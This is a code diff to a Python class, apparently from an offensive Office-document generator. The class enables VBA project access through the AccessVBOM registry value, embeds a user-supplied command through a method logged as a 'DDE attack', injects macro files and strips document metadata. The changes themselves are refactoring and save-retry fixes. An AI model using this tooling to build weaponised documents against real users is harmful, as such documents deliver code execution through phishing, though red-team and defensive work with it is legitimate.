@@ -4,7 +4,8 @@
 # Only enabled on windows
 import sys
 import os
-from common.utils import MSTypes
+from common.utils import MSTypes, MPParam, getParamValue
+
 if sys.platform == "win32":
     # Download and install pywin32 from https://sourceforge.net/projects/pywin32/files/pywin32/
     import win32com.client # @UnresolvedImport
@@ -13,7 +14,6 @@ if sys.platform == "win32":
 import logging
 from common import utils
 from modules.vba_gen import VBAGenerator
-from collections import OrderedDict
 
 
 
@@ -38,11 +38,11 @@ class WordGenerator(VBAGenerator):
         objWord = win32com.client.Dispatch("Word.Application")
         objWord.Visible = False # do the operation in background 
         self.version = objWord.Application.Version
-        # IT is necessary to exit office or value wont be saved
+        # IT is necessary to exit office or value won't be saved
         objWord.Application.Quit()
         del objWord
         # Next change/set AccessVBOM registry value to 1
-        keyval = "Software\\Microsoft\Office\\"  + self.version + "\\Word\\Security"
+        keyval = "Software\\Microsoft\Office\\" + self.version + "\\Word\\Security"
         logging.info("   [-] Set %s to 1..." % keyval)
         Registrykey = winreg.CreateKey(winreg.HKEY_CURRENT_USER,keyval)
         winreg.SetValueEx(Registrykey,"AccessVBOM",0,winreg.REG_DWORD,1) # "REG_DWORD"
@@ -52,7 +52,7 @@ class WordGenerator(VBAGenerator):
     def disableVbom(self):
         # Disable writing in VBA project
         #  Change/set AccessVBOM registry value to 0
-        keyval = "Software\\Microsoft\Office\\"  + self.version + "\\Word\\Security"
+        keyval = "Software\\Microsoft\Office\\" + self.version + "\\Word\\Security"
         logging.info("   [-] Set %s to 0..." % keyval)
         Registrykey = winreg.CreateKey(winreg.HKEY_CURRENT_USER,keyval)
         winreg.SetValueEx(Registrykey,"AccessVBOM",0,winreg.REG_DWORD,0) # "REG_DWORD"
@@ -81,9 +81,9 @@ class WordGenerator(VBAGenerator):
     def insertDDE(self):
         logging.info(" [+] Include DDE attack...")
         # Get command line
-        paramDict = OrderedDict([("Cmd_Line",None)])      
-        self.fillInputParams(paramDict)
-        command = paramDict["Cmd_Line"]
+        paramArray = [MPParam("Command line")]
+        self.fillInputParams(paramArray)
+        command = getParamValue(paramArray, "Command line")
 
         logging.info("   [-] Open document...")
         # open up an instance of Word with the win32com driver
@@ -140,14 +140,14 @@ class WordGenerator(VBAGenerator):
             for vbaFile in self.getVBAFiles():
                 logging.debug("     -> File %s" % vbaFile)
                 if vbaFile == self.getMainVBAFile():       
-                    with open (vbaFile, "r") as f:
+                    with open(vbaFile, "r") as f:
                         # Add the main macro- into ThisDocument part of Word document
                         wordModule = document.VBProject.VBComponents("ThisDocument")
                         macro=f.read()
                         #logging.info(macro)
                         wordModule.CodeModule.AddFromString(macro)
                 else: # inject other vba files as modules
-                    with open (vbaFile, "r") as f:
+                    with open(vbaFile, "r") as f:
                         macro=f.read()
                         #logging.info(macro)
                         wordModule = document.VBProject.VBComponents.Add(1)
@@ -158,8 +158,13 @@ class WordGenerator(VBAGenerator):
                         document.Repaginate()
                         document.Application.ScreenUpdating = True 
                         document.Application.ScreenRefresh()
-                        #logging.info("   [-] Saving module %s..." %  wordModule.Name)
-                        document.Save()
+                        logging.debug("   [-] Saving module %s..." %  wordModule.Name)
+                        try:
+                            document.Save()
+                        except:
+                            import time  # Retry
+                            time.sleep(1)
+                            document.Save()
             
             #word.DisplayAlerts=False
             # Remove Informations
@@ -168,7 +173,13 @@ class WordGenerator(VBAGenerator):
             document.RemoveDocumentInformation(wdRDIAll)
             
             # save the document and close
-            document.Save()
+            #input('Press ENTER to continue...')
+            try:
+                document.Save()
+            except:
+                import time # Retry
+                time.sleep(1)
+                document.Save()
             document.Close()
             word.Application.Quit()
             # garbage collection
